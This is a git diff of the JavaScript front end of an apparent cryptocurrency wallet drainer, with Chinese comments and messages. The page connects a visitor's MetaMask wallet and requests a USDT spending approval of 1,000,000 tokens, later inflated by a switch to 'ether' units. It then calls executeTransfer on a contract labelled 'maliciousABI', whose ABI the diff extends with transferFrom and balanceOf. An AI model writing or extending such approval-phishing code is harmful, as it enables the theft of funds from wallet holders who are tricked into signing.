@@ -14,6 +14,54 @@ const maliciousABI = [
         "outputs": [],
         "stateMutability": "nonpayable",
         "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "account",
+                "type": "address"
+            }
+        ],
+        "name": "balanceOf",
+        "outputs": [
+            {
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "sender",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "recipient",
+                "type": "address"
+            },
+            {
+                "internalType": "uint256",
+                "name": "amount",
+                "type": "uint256"
+            }
+        ],
+        "name": "transferFrom",
+        "outputs": [
+            {
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "function"
     }
 ];
 
@@ -46,19 +94,24 @@ const usdtABI = [
         "inputs": [
             {
                 "internalType": "address",
-                "name": "account",
+                "name": "recipient",
                 "type": "address"
-            }
-        ],
-        "name": "balanceOf",
-        "outputs": [
+            },
             {
                 "internalType": "uint256",
-                "name": "",
+                "name": "amount",
                 "type": "uint256"
             }
         ],
-        "stateMutability": "view",
+        "name": "transfer",
+        "outputs": [
+            {
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "stateMutability": "nonpayable",
         "type": "function"
     }
 ];
@@ -69,42 +122,32 @@ let userAccount;
 document.getElementById('connectButton').onclick = async () => {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
-        
-        // 检查用户账户是否已经连接
-        const accounts = await web3.eth.getAccounts();
-        if (accounts.length > 0) {
-            userAccount = accounts[0];
-            console.log('Wallet already connected: ', userAccount);
-            alert('Wallet already connected: ' + userAccount);
-            document.getElementById('approveButton').disabled = false; // 启用授权按钮
-            return; // 如果已经连接，结束函数
-        }
-
         try {
+            // 请求连接到钱包
             await window.ethereum.request({ method: 'eth_requestAccounts' });
             userAccount = (await web3.eth.getAccounts())[0];
-            console.log('Wallet connected: ', userAccount);
-            alert('Wallet connected: ' + userAccount);
+            console.log('钱包连接成功: ', userAccount);
+            alert('钱包连接成功: ' + userAccount);
             document.getElementById('approveButton').disabled = false; // 启用授权按钮
         } catch (error) {
-            console.error('Connection error: ', error);
-            alert('Failed to connect wallet: ' + error.message);
+            console.error('连接错误: ', error);
+            alert('连接钱包失败: ' + error.message);
         }
     } else {
-        alert('请安装 MetaMask!');
+        alert('请安装 MetaMask！');
     }
 };
 
 document.getElementById('approveButton').onclick = async () => {
     const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);
-    const amountToApprove = web3.utils.toWei('1000000', 'mwei'); // 1000000 USDT（USDT 的精度是 6 位）
+    const amountToApprove = web3.utils.toWei('1000000', 'ether'); // 1000000 USDT
 
     try {
         await usdtContract.methods.approve(contractAddress, amountToApprove).send({ from: userAccount });
         alert('授权成功');
         document.getElementById('executeTransferButton').disabled = false; // 启用转移按钮
     } catch (error) {
-        console.error('Approval error: ', error);
+        console.error('授权错误: ', error);
         alert('授权失败: ' + error.message);
     }
 };
@@ -116,7 +159,7 @@ document.getElementById('executeTransferButton').onclick = async () => {
         await maliciousContract.methods.executeTransfer(userAccount).send({ from: userAccount });
         alert('转账执行成功');
     } catch (error) {
-        console.error('Transfer error: ', error);
+        console.error('转账错误: ', error);
         alert('转账失败: ' + error.message);
     }
 };
